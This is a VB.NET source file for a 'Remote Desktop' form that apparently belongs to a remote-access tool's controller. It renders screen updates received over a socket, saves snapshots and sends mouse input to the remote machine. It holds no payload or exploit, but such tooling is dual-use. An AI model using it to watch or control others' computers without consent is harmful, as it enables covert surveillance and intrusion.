﻿Imports System.Text

Public Class Cap
    Public F As Form1
    Public Sock As Integer
    Public Sz As Size
    Public snapfolder As String = ""
    Dim mouseControl As Boolean = False

    Private Sub Cap_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        For i As Integer = 0 To 13
            C1.Items.Add(QZ(i))
        Next
        For i As Integer = 1 To 10
            C2.Items.Add(i)
        Next
        P1.Image = New Bitmap(Sz.Width, Sz.Height)
        C1.SelectedIndex = 4
        C2.SelectedIndex = 4


    End Sub
    Public Sub PktToImage(ByVal BY As Byte())
        If Button1.Text = "Stop" Then
            F.S.Send(Sock, "@" & F.Yy & C1.SelectedIndex & F.Yy & C2.Text & F.Yy & C.Value)
        End If
        Dim B As Array = fx(BY, "cap")
        Dim Q As New IO.MemoryStream(CType(B(1), Byte()))
        Dim L As Bitmap = Image.FromStream(Q)
        Dim QQ As String() = Split(BS(B(0)), ",")
        Me.Text = "Remote Desktop {" & F.S.IP(Sock).ToString & "} Size: " & siz(BY.LongLength) & " ,Changes: " & QQ.Length - 2
        Dim K As Bitmap = P1.Image.GetThumbnailImage(CType(Split(QQ(0), ".")(0), Integer), CType(Split(QQ(0), ".")(1), Integer), Nothing, Nothing)
        Dim G As Graphics = Graphics.FromImage(K)
        Dim tp As Integer = 0
        For i As Integer = 1 To QQ.Length - 2
            Dim P As New Point(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1))
            Dim SZ As New Size(L.Width, Split(QQ(i), ".")(2))
            G.DrawImage(L.Clone(New Rectangle(0, tp, L.Width, CType(Split(QQ(i), ".")(2), Integer)), L.PixelFormat), New Point(CType(Split(QQ(i), ".")(0), Integer), CType(Split(QQ(i), ".")(1), Integer)))
            If CheckBox1.Checked Then
                Dim r As New Rectangle(Split(QQ(i), ".")(0), Split(QQ(i), ".")(1), SZ.Width, SZ.Height)
                G.DrawRectangle(Pens.Red, r)
            End If
            tp += SZ.Height
        Next
        G.Dispose()
        P1.Image = K
    End Sub
    Function QZ(ByVal q As Integer) As Size
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Sub P1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs)
        If mouseControl = True Then
            Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 2
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 8
            End If
            F.S.Send(Sock, "#" & F.Yy & PP.X & F.Yy & PP.Y & F.Yy & but)
        End If
    End Sub
    Private Sub P1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs)
        If mouseControl = True Then
            Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
            Dim but As Integer
            If e.Button = Windows.Forms.MouseButtons.Left Then
                but = 4
            End If
            If e.Button = Windows.Forms.MouseButtons.Right Then
                but = 16
            End If
            F.S.Send(Sock, "#" & F.Yy & PP.X & F.Yy & PP.Y & F.Yy & but)
        End If

    End Sub
    Dim op As New Point(1, 1)
    Private Sub P1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs)
        If mouseControl = True Then
            If Button1.Text = "Stop" Then
                Dim PP = New Point(e.X * (Sz.Width / P1.Width), e.Y * (Sz.Height / P1.Height))
                If PP <> op Then
                    op = PP

                End If

            End If
        End If
    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Timer1.Enabled = False
        If op = Nothing Then
        Else
            If Button1.Text = "Stop" Then
                Dim pp As New Point(0, 0)
                pp.X = op.X
                pp.Y = op.Y
                op = Nothing
                F.S.Send(Sock, "$" & F.Yy & pp.X & F.Yy & pp.Y & F.Yy)
            End If
        End If
        Timer1.Enabled = True
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If Button1.Text = "Start" Then
            F.S.Send(Sock, "@" & F.Yy & C1.SelectedIndex & F.Yy & C2.Text & F.Yy & C.Value)
            Button1.Text = "Stop"
        Else
            Button1.Text = "Start"
        End If
    End Sub



    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        setpanel.Visible = False
        paneltop.Visible = False
        Button3.Visible = False
        Button2.Visible = True
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click

        paneltop.Visible = True
        Button3.Visible = True
        Button2.Visible = False
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        My.Computer.Audio.Play(My.Resources.camera, AudioPlayMode.Background)
        Dim s As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        Dim r As New Random
        Dim sb As New StringBuilder
        For i As Integer = 1 To 8
            Dim idx As Integer = r.Next(0, 35)
            sb.Append(s.Substring(idx, 1))
        Next

        P1.Image.Save(snapfolder & "\" & sb.ToString() & ".png")
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        If mouseControl = False Then
            mouseControl = True
        ElseIf mouseControl = True Then
            mouseControl = False
        End If
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        If setpanel.Visible = True Then
            setpanel.Visible = False
        Else
            setpanel.Visible = True
        End If


    End Sub

End Class